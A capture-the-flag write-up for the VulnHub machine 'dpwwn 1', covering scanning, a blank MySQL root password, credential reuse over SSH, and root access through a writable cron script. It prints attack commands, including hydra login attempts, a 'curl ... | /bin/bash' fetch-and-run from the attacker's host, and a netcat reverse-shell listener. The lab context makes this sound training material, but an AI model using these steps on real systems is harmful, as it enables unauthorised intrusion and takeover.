---
title: "Dpwwn 1"
date: 2024-05-25
draft: false
summary: "Writeup for Dpwwn 1 CTF on VulnHub. A boot to root challenge requiring us to capture the flag from the root directory."
tags: ["linux", "cron", "service misconfiguration"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/dpwwn1/cover.webp"
  caption: "Dpwwn VulnHub Challenge"
  alt: "Dpwwn cover"
platform: "VulnHub"
---

**dpwwn1** is a boot to root challenge that requires us to obtain the contents of `dpwwn-01-FLAG.txt` under */root* Directory.
<!--more-->
To download **dpwwn 1**, click on the link given below:
- https://www.vulnhub.com/entry/dpwwn-1,342/

## Recon

I performed a network scan to discover the target IP.

```bash
nmap -sn 192.168.1.0/24                 
```

I then performed an **nmap** aggressive scan to find open ports and services.

```shell
nmap -A -p- TARGET --min-rate 10000 -oN dpwwn1.nmap
```

| **Port** | **Service** |
| -------- | ----------- |
| 22       | ssh         |
| 80       | http        |
| 3306     | mysql       |

![](https://cdn.ziomsec.com/dpwwn1/1.webp)

## Initial Foothold

I visited the web application running on port 80 through my browser and landed on a testing page.

![](https://cdn.ziomsec.com/dpwwn1/2.webp)

I then ran a **ffuf** scan to find hidden files and found an interesting file.

```shell
ffuf -u http://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-file.txt -mc 200,302
```

![](https://cdn.ziomsec.com/dpwwn1/3.webp)

I then visited the *info.php* endpoint and got the results of `phpinfo()` function.

![](https://cdn.ziomsec.com/dpwwn1/4.webp)

This page provided 2 potential usernames, "root" and "apache". I tried connecting to the **mysql** server using these usernames with a blank password and got access as "root".

```shell
hydra -l 'apache' -p '' mysql://TARGET
hydra -l 'root' -p '' mysql://TARGET
```

![](https://cdn.ziomsec.com/dpwwn1/5.webp)

```shell
mysql -u root -H target -p
# hit enter
```

![](https://cdn.ziomsec.com/dpwwn1/6.webp)

Here, I found a set of credentials in the *users* table.

```mysql
use ssh;
show tables;
select * from users
```

![](https://cdn.ziomsec.com/dpwwn1/7.webp)

![](https://cdn.ziomsec.com/dpwwn1/8.webp)

I used these credentials to connect via **ssh**.

![](https://cdn.ziomsec.com/dpwwn1/9.webp)

With this, I gained a foothold on the machine.

## Privilege Escalation

To enumerate privilege escalation vectors, I downloaded the **linux smart enumeration** script on my target system:
- https://github.com/diego-treitos/linux-smart-enumeration

> I had the script locally so I just transferred it by hosting a local http server.

```shell
python -m http.server 8080
```

![](https://cdn.ziomsec.com/dpwwn1/10.webp)

```shell
curl http://KALI:8080/lse.sh | /bin/bash
```

![](https://cdn.ziomsec.com/dpwwn1/11.webp)

![](https://cdn.ziomsec.com/dpwwn1/12.webp)

Through this, I discovered that the bash script present in my home directory was being executed as a **cronjob**. Cron jobs are scheduled tasks that are executed automatically after certain conditions are fulfilled.

![](https://cdn.ziomsec.com/dpwwn1/13.webp)

```shell
cat /etc/crontab
```

![](https://cdn.ziomsec.com/dpwwn1/14.webp)

The *crontab* confirmed that the bash script was being executed as *root*. To understand the execution schedule, I visited **[crontab guru](https://crontab.guru/)**.

![](https://cdn.ziomsec.com/dpwwn1/15.webp)

Since I had permissions to write into the file, I could execute any command as *root*. Hence, I visited **revshells** and selected a bash payload that would get me a reverse shell.
- https://www.revshells.com/

![](https://cdn.ziomsec.com/dpwwn1/16.webp)

I then added this payload to the bash script and started a reverse shell listener using **netcat**.

![](https://cdn.ziomsec.com/dpwwn1/17.webp)

```bash
rlwrap nc -lnvp 4444
```

After 3 minutes and I got a reverse connection on my **netcat** listener.

![](https://cdn.ziomsec.com/dpwwn1/18.webp)

I spawned a **tty** shell and captured the flag from the */root* directory.

```sell
python -c 'import pty;pty.spawn("/bin/bash")'
cat dpwwn-01-FLAG.txt
```

![](https://cdn.ziomsec.com/dpwwn1/19.webp)

## Closure

Here's a summary of how I pwned **dpwwn 1**:
1. I identified potential users from the **phpinfo** page using web fuzzing.
2. One of these users had credentials for the **mysql** server on the target, which allowed me to access the system via **ssh**.
3. A script in the *mystic* user's directory was executed by *crontab* as *root*, providing me with a reverse shell as *root*.
4. With *root* access, I retrieved the flag located in */root*.

That's all from my side! Happy Hacking :)

---
